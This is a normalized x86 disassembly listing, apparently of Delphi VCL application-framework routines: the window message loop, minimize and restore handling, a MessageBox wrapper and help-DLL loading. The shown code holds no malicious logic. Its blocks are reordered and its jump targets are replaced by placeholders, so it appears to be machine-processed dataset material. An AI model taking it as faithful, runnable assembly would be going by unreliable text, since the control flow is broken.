cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_472264
jmp r-xdata
push ebp
call sub_474b24
pop ecx
jmp r-xdata
push ebp
call sub_474b60
pop ecx
jmp r-xdata
push ebp
call sub_474b24
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4749c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_47537c
jmp r-xdata
jmp r-xdata
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4749b4
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4749c4
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4749bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_46c878
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_474b24
pop ecx
jmp r-xdata
call sub_46c92c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_474b24
pop ecx
jmp r-xdata
call sub_44ae1c
call sub_44af58
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d604
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_4752cc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4749b4
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_4742e4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_45c380
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_45c380
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_47537c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_4742e4
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_45c380
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_4749c4
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_45c380
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_46fff0
mov eax [ ebx + 0x44 ]
call sub_47240c
sub_47547c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_4754b8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403fd0
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_40406c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_475504
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_475528
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_475578
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_4528d8
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_45c380
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_475630
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_476590
sub_475664
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_45c380
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_4033e8
test al al
jne r-xdata
sub_4756d0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_475630
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_475528
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_475578
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_475504
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_475768
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4756d0
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_476038
sub_47578c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_418da4
mov eax 0x8
call sub_40276c
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_418c68
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_4757e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418dc4
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_40278c
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418cb4
jmp r-xdata
sub_47587c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_4036cc#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_45c35c
mov [ esi + 0x44 ] edi
sub_4758fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_4759da
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_46c7f0
call sub_407e68
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4759e1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_46fff0
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_4036cc#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_475768
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_46eef8
mov eax [ ebp - 0x4 ]
call sub_4752cc
jmp r-xdata
sub_4759fc
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_4027fc
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40281c
push eax
call sub_4027fc
pop edx
call sub_40ba38
call sub_4027fc
mov edx [ rw-data ]
call sub_403378
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_4027fc
mov edx eax
mov eax ebx
call sub_475bf4
pop esi
pop ebx
retn
call sub_4027fc
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_475a8c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_46c878
mov [ ebp - 0x10 ] eax
call sub_46c794
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_474a30
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_475be1
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475be8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_46c92c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_46c79c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_475bf4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_475caf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404014
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_4754b8
mov eax [ ebp - 0x108 ]
call sub_40443c
push eax
mov eax [ ebp - 0x4 ]
call sub_40443c
mov edx eax
mov eax ebx
pop ecx
call sub_475a8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475cb6
lea eax [ ebp - 0x108 ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
call sub_4087b8
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402cec
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b04
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404244
sub_475ccc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_45c51c
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_45c684
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_476370
test al al
je r-xdata
call sub_45c380
mov ebp eax
mov eax edi
call sub_45c380
mov ebp eax
mov eax esi
call sub_476370
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_475e34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_475e8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_476370
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_476bbc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475e93
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_475e9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_475ef4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_476370
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_476bbc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475efb
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_475f0c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4031ec
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_455bec
jmp r-xdata
sub_475f5c
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_473508
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_45c380
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4734f4
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_45c380
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_475fc0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_4542f8
mov edi eax
call sub_452bf4
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_456c00
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_456c00
sub_476038
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476148
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_475fc0
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_474070
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_452b5c
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4761f8
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_4760ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_476590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_475f5c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_42114c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47614f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fa0
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_476158
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_4734ec
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_4734d8
movzx edx di
xor ecx ecx
call sub_456c00
inc esi
dec ebx
jne r-xdata
sub_476194
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4752b0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_4752b0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_476158
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_4761f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404388
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403fd0
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f310
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4623b4
xor eax eax
push ebp
push sub_47627d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_47628c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_4762e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4734ec
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_47628c
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4734d8
